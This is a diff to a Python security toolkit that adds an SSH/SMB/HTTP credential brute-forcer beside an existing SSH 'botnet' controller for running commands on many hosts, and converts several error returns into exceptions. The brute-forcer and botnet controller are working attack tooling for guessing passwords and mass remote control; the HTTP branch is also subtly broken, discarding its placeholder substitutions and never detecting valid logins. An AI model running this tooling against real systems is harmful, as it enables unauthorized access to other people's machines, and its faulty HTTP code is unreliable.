@@ -1,3 +1,5 @@
+import time
+
 def rot_n_cipher(text: str, movement: int) -> str:
     ascii_list= [ord(char) for char in text]
 
@@ -15,7 +17,7 @@ def rot_n_cipher(text: str, movement: int) -> str:
                 ascii_list[i] = (n + movement)
 
         else:
-            return "only accept letters"
+            raise ValueError("only accept letters")
 
     return "".join(chr(val) for val in ascii_list)
 
@@ -33,7 +35,7 @@ def text_to_emoji(text:str)->str:
         elif 96 < ord(char) < 123:
             ascii_list.append(final_list[ord(char)-97+26])
         else:
-            return "only letters"
+            raise ValueError("only letters")
     print(ascii_list)
     ciphertext="".join(val.encode('utf-8').decode('unicode_escape') for val in ascii_list)
     return ciphertext
@@ -48,7 +50,7 @@ def web_scrape(url:str,tag:str,attr_regex:dict)-> list[str]|str:
         listing=soup.find_all(tag, attrs=attr_regex)
         final_list=[results.get_text() for results in listing]
     else:
-        return "cannot reach"
+        raise ValueError("cannot reach")
 
     return final_list
 
@@ -105,13 +107,13 @@ def para_connector(bot:str,port:int,username:str,password:str):
         client.connect(bot, port, username, password)
         return client
     except Exception as e:
-        print(f"Failed to connect to {bot}: {e}")
+        raise ValueError(f"Failed to connect to {bot}: {e}")
 
 def ssh_botnet(bot_ip_port: list[tuple], username: str) -> int:
     password = getpass.getpass("Password: ")
     clients = [para_connector(bot,port,username,password) for (bot, port) in bot_ip_port]
     if len(clients) < 1:
-        return 0
+        raise ValueError("no host")
     while True:
         choice = input("""Enter choice (using only numbers): 
 1. List bots and their session numbers
@@ -131,7 +133,7 @@ enter choice: """)
                 stdin, stdout, stderr = clients[session].exec_command(command)
                 error_output=stderr.read().decode().strip()
                 if error_output:
-                    print(error_output)
+                    raise ValueError(error_output)
                 else:
                     print(stdout.read().decode().strip())
             case '3':
@@ -143,4 +145,81 @@ enter choice: """)
                 print("Invalid selection.")
     return 1
 
+from itertools import product
 
+def brute_forcer(mode:str,host:str,users:list[str],passwords:list[str],sample_request:str=None,user_param:str=None,pass_param:str=None,delay:int=3,port:int=None,domain:str=None) -> list | str:
+    if "http" in mode.lower() and (sample_request is None or user_param is None or pass_param is None):
+        raise ValueError("http mode requires additional file, user_param and pass_param that contains request")
+    correct_creds=[]
+    match mode.lower():
+        case s if re.search(r"https?",s):
+            import requests
+            port = port or (443 if mode.lower() == "https" else 80)
+            with (open(sample_request, 'r',encoding='utf-8') as file):
+                file_contents = file.read()
+                if "^USER^" not in file_contents or "^PASS^" not in file_contents:
+                    raise ValueError("need to indicate placeholders for username/password in sample request using ^USER^ and ^PASS^")
+                try:
+                    header_section, body = file_contents.split('\r\n\r\n', 1)
+                    method, headers = header_section.split('\r\n', 1)
+                except:
+                    raise ValueError("ensure request is formatted as header+2crlf+body")
+                req_headers = {key.strip(): val.strip() for key, val in (line.split(":",1) for line in headers.split("\r\n") if ":" in line)}
+                path, _, params = method.split()[1].partition("?")
+                match method:
+                    case s if s.startswith("GET"):
+
+                        for username, password in product(users, passwords):
+                            params.replace("^USER^", username).replace("^PASS^",password)
+                            params_dict = {key.strip(): val.strip() for key, val in
+                                           (key_pair.split("=", 1) for key_pair in params.split("&"))}
+                            try:
+                                requests.get(host+":"+str(port)+path,headers=req_headers,params=params_dict)
+                            except Exception as e:
+                                raise ValueError(f"the error:{e} for {username}/{password}")
+                            time.sleep(delay)
+                        return correct_creds
+                    case s if s.startswith("POST"):
+                        for username, password in product(users, passwords):
+                            try:
+                                params_dict = {key.strip(): val.strip() for key, val in
+                                               (key_pair.split("=", 1) for key_pair in params.split("&"))}
+                                body.replace("^USER^", username).replace("^PASS^", password)
+                                requests.post(host+":"+str(port)+path,params=params_dict,data=body)
+                            except:
+                                raise
+                        return correct_creds
+                    case _:
+                        raise ValueError("http methods available for testing are POST or GET")
+        case "ssh":
+            port = port or 22
+            import paramiko
+            for username, password in product(users,passwords):
+                try:
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(host, port, username, password)
+                    correct_creds.append((username, password))
+                    client.close()
+                except Exception as e:
+                    print(f"Connection failed: {e} for {username}:{password}")
+                time.sleep(delay)
+            return correct_creds
+        case "smb":
+            port = port or 445
+            domain = domain or "."
+            from smb.SMBConnection import SMBConnection
+            from smb.smb_structs import OperationFailure
+            for username, password in product(users,passwords):
+                try:
+                    conn = SMBConnection(username, password, "client_name", host, domain=domain, use_ntlm_v2=True)
+                    result = conn.connect(host, port)
+                    if result:
+                        correct_creds.append((username, password))
+                    conn.close()
+                except OperationFailure as e:
+                    raise ValueError(f"Connection failed: {e} for {username}:{password}")
+                time.sleep(delay)
+            return correct_creds
+        case _:
+            return "unidentified mode"
